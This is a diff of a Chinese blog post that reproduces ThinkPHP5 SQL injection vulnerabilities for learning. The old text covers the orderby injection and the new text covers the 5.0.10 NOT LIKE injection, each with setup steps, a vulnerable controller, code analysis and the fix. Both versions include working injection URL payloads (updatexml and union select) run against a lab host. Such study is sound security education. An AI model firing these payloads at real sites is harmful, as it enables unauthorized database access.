@@ -209,7 +209,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      796 字
+      1.1k 字
     </span>
   
 
@@ -219,7 +219,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      14
        分钟
     </span>
   
@@ -261,47 +261,56 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年11月9日 晚上
+                  本文最后更新于：2021年6月13日 晚上
                 
               </p>
             
             <div class="markdown-body">
-              <p>本系列文章将对Thinkphp的历史漏洞进行分析复现，来增加自己代码审计的能力，以及对大型框架的了解。这是第三篇文章，将分析学习ThinkPHP5中的存在的SQL注入漏洞（orderby方法的注入）</p>
-<h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="1-漏洞概要"><a href="#1-漏洞概要" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h1><p>本次漏洞存在于 <strong>Builder</strong> 类的<strong>parseOrder</strong> 方法中，依旧是因为没有对数据进行很好的检查和过滤，而将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p>
-<p>漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p>
+              <p>本篇文章大部分是直接摘用参考文章的语句（迫不得已，文章丢了，重新写的，因此偷懒直接拿）</p>
+<h1 id="1-漏洞概要"><a href="#1-漏洞概要" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h1><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>ThinkPHP=5.0.10</strong> 。</p>
 <h1 id="2-漏洞环境"><a href="#2-漏洞环境" class="headerlink" title="2.漏洞环境"></a>2.漏洞环境</h1><p>通过以下命令获取漏洞环境</p>
-<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer</span> <span class="hljs-built_in">create-project</span> <span class="hljs-string">topthink</span>/<span class="hljs-string">think</span>=<span class="hljs-string">5</span>.<span class="hljs-string">1</span>.<span class="hljs-string">22</span> <span class="hljs-string">tpdemo4</span> <span class="hljs-built_in">--no-plugins</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer</span> <span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink</span>/<span class="hljs-string">think</span>=<span class="hljs-string">5</span>.<span class="hljs-string">0</span>.<span class="hljs-string">10</span> <span class="hljs-string">tpdemo2</span><br></code></pre></td></tr></table></figure>
 <p>修改<code>composer.json</code>里的<code>require</code>字段</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.4.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.22&quot;</span><br>&#125;<span class="hljs-punctuation">,</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.4.0&quot;</span>,<br>    <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.0.10&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure>
 <p>然后执行如下命令，将版本进行调整</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">composer</span> update --<span class="hljs-literal">no</span>-plugins<br></code></pre></td></tr></table></figure>
 <p>接下来设置漏洞触发点：将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$orderby</span> = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;reader-l&#x27;</span>])-&gt;order(<span class="hljs-variable">$orderby</span>)-&gt;find();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>])-&gt;select();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>同时我们需要在mysql设置相应的数据库和对应的表、列</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database tpdemo;<br>use tpdemo;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>	id <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span> auto_increment,<br>	username <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database tpdemo;<br>use tpdemo;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>	id <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span> auto_increment,<br>	username <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;reader-l&#x27;</span>);<br><br></code></pre></td></tr></table></figure>
 <p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息。</p>
 <p>在 <strong>application/config.php</strong> 中开启 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。</p>
-<h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h1><p>访问如下链接，即可触发漏洞</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.199.246:7777/tpdemo4/public/index.php/index/index/index?orderby</span>[<span class="hljs-string">id`|updatexml(1,concat(0x7e,user(),0x7e),1)%23</span>]=1<br></code></pre></td></tr></table></figure>
+<h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h1><p>访问：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.reader-l.com:<span class="hljs-number">7777</span>/tpdemo<span class="hljs-number">2</span>/public/index.php/index/index/index?username[<span class="hljs-number">0</span>]=not%<span class="hljs-number">20</span>like&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=reader-l&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">233</span>&amp;username[<span class="hljs-number">2</span>]=)%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,user()%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<p>触发漏洞</p>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/0.png" srcset="/img/loading.gif"></p>
+<p>payload优化：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.reader-l.com:<span class="hljs-number">7777</span>/tpdemo<span class="hljs-number">2</span>/public/index.php/index/index/index?username[<span class="hljs-number">0</span>]=not%<span class="hljs-number">20</span>like&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=%%&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">233</span>&amp;username[<span class="hljs-number">2</span>]=)%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,user()%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/1.png" srcset="/img/loading.gif"></p>
-<h1 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h1><p>之前分析过，<code>request()-&gt;get()</code>会默认调用<code>input</code>方法来从客户端获取数据。而<code>input</code>方法会用<code>filterValue</code>方法进行简单过滤处理，但是不会对传入数组键值进行检查和过滤。所以会直接原样的传入到下图第9行的语句中。</p>
+<h1 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h1><p>跟着payload来看看漏洞原理，首先，不管以哪种方式传递数据给服务器，这些数据在 <strong>ThinkPHP</strong> 中都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法。跟进该方法进行查看：数据不仅会被强制类型转换，还都会经过 <strong>filterValue</strong> 方法的处理。</p>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/2.png" srcset="/img/loading.gif"></p>
-<p>在<code>Query</code>类下的<code>order</code>方法可以看到用户传入的数据没有经过任何的检查和过滤就直接赋值给了<code>$this-&gt;options[&#39;order&#39;]</code>了。</p>
+<p>跟进<code>filterValue</code>方法进行查看：该方法是用来过滤表单中的表达式，但是我们仔细看其代码，会发现少过滤了 <strong>NOT LIKE</strong> ，而本次漏洞正是利用了这一点。</p>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/3.png" srcset="/img/loading.gif"></p>
-<p>接下来该跟进<code>find()</code>方法了，发现是跟进了<code>Query</code>类下的<code>find</code>方法</p>
-<p>经过<code>parseOptions</code>分析数据，简单整理数据后，用户传入的数据就会直接传入<code>Connection</code>类下的<code>find</code>方法了</p>
+<p>我们回到处理 <strong>SQL</strong> 语句的方法上。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/4.png" srcset="/img/loading.gif"></p>
-<p>跟进<code>Connection</code>类下的<code>find</code>方法：</p>
-<p>可以看到经过<code>getOptions</code>分析查询的表达式后的数据直接传到了<code>Builder</code>类下的<code>select</code>方法了</p>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/5.png" srcset="/img/loading.gif"></p>
-<p>跟进<code>Builder</code>类的<code>select</code>方法，我们注重关注<code>parseOrder</code>方法。</p>
-<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/6.png" srcset="/img/loading.gif"></p>
-<p>跟进<code>parseOrder</code>方法：</p>
-<p>在 <code>parseOrder</code> 方法中，我们看到程序通过 <code>Mysql</code>类<code>parseKey</code> 方法给我们的数组键值的两边加上了反引号，然后直接拼接字符串返回，没有进行任何过滤、检测，这也是导致本次 <strong>SQL注入漏洞</strong> 的原因。</p>
+<p>上面的 <strong>$this-&gt;builder</strong> 为 <strong>\think\db\builder\Mysql</strong> 类，该类继承于 <strong>Builder</strong> 类，所以接着会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法。在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。我们跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/7.png" srcset="/img/loading.gif"></p>
-<h1 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h1><p>修复逻辑是：在调用<code>parseKey</code>方法对SQL语句进行拼接之前，先验证穿进来的数据是否存在<code>)</code>和<code>#</code>的。</p>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/6.png" srcset="/img/loading.gif"></p>
+<p>继续跟进 <strong>buildWhere</strong> 函数，发现用户可控数据又被传入了 <strong>parseWhereItem</strong> where子单元分析函数，该函数的返回结果存储在 <strong>$str</strong> 变量中，并被拼接进 <strong>SQL</strong> 语句。</p>
 <p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/8.png" srcset="/img/loading.gif"></p>
-<h1 id="6-参考连接"><a href="#6-参考连接" class="headerlink" title="6.参考连接"></a>6.参考连接</h1><p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D</a></p>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/10.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/11.png" srcset="/img/loading.gif"></p>
+<p>我们跟进 <strong>parseWhereItem</strong> 方法，发现当操作符等于 <strong>NOT LIKE</strong> 时，程序所使用的 <strong>MYSQL</strong> 逻辑操作符竟然可由用户传来的变量控制，这样也就直接导致了 <strong>SQL注入漏洞</strong> 的发生。</p>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/9.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/12.png" srcset="/img/loading.gif"></p>
+<p>正是由于 <strong>ThinkPHP</strong> 官方的 <strong>filterValue</strong> 方法漏过滤了 <strong>NOT LIKE</strong> ，同时 <strong>MYSQL</strong> 逻辑操作由用户变量控制，使得这一漏洞可以被利用。</p>
+<h1 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h1><p>以下解答来自<a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">Mochazz的文章</a></p>
+<blockquote>
+<p>在 <strong>5.0.10</strong> 之后的版本，官方的修复方法是：在 <strong>Request.php</strong> 文件的 <strong>filterValue</strong> 方法中，过滤掉 <strong>NOT LIKE</strong> 关键字。而在 <strong>5.0.10</strong> 之前的版本中，这个漏洞是不存在的，但是其代码也没有过滤掉 <strong>NOT LIKE</strong> 关键字，这是为什么呢？经过调试，发现原来在 <strong>5.0.10</strong> 之前的版本中，其默认允许的表达式中不存在 <strong>not like</strong> （注意空格），所以即便攻击者可以通过外部控制该操作符号，也无法完成攻击。（会直接进入下入157行，下图是 <strong>5.0.9</strong> 版本的代码）相反， <strong>5.0.10</strong> 版本其默认允许的表达式中，存在 <strong>not like</strong> ，因而可以触发漏洞。</p>
+</blockquote>
+<p><img src="/2020/11/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%9B%9B/13.png" srcset="/img/loading.gif"></p>
+<h1 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h1><p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D</a></p>
 
             </div>
             <hr>
